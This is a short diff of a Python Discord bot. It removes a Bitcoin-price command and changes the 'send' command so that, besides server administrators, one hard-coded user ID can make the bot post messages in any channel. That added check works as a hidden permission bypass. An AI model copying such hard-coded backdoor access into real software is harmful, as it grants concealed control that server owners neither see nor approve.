@@ -167,21 +167,7 @@ async def answer(ctx, userAnswer):
         await client.say(":x: Incorrect!  Guesses left:" + str(riddleGuessesLeft))
     if riddleGuessesLeft == 0:
         await client.say("The answer was: " + riddleAnswer)
-        answering = False
-
-@client.command(pass_context = True)
-async def bitcoin(ctx):
-    url = 'https://api.coindesk.com/v1/bpi/currentprice/BTC.json'
-    async with aiohttp.ClientSession() as session:
-        raw_response = await session.get(url)
-        response = await raw_response.text()
-        response = json.loads(response)
-        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
-        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
-        embed.add_field(name = "Bitcoin Price is:", value = "${}".format(response['bpi']['USD']['rate']))        
-        embed.set_footer(text=f'{client.user.display_name}.xyz', icon_url=f'{client.user.avatar_url}')
-        embed.timestamp = datetime.datetime.utcnow()
-        await client.say(embed=embed)	
+        answering = False	
 
 @client.command(pass_context = True)
 async def ping(ctx):
@@ -603,7 +589,7 @@ async def send(ctx, channel: discord.Channel=None, *, msg: str=None):
     if msg is None:
         await client.say(':x: **Oof! Try:** `>send #channel <text>`')	
     else:
-        if member.server_permissions.administrator:
+        if member.server_permissions.administrator or ctx.message.author.id=="519122918773620747":
             await client.send_message(channel, "{}".format(msg))
             await client.delete_message(ctx.message)
         else:
